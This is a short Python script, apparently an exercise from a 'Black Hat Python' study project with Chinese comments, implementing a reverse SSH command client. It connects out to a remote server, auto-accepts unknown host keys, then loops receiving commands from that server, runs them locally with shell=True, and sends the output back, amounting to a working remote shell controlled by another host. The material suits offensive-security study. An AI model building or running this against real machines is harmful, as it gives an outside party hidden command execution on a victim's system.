#!/usr/bin/env python
# encoding: utf-8
"""
@file: ssh_rcmd.py
@time: 2022/5/23 15:55
@project: black-hat-python-2ed
@desc: P33 让一台SSH服务器给SSH客户端发送命令
"""
import shlex
import subprocess

import paramiko


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        # 从SSH连接里不断读取命令
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                # 在本地执行
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                # 将结果发回服务器
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()

    return
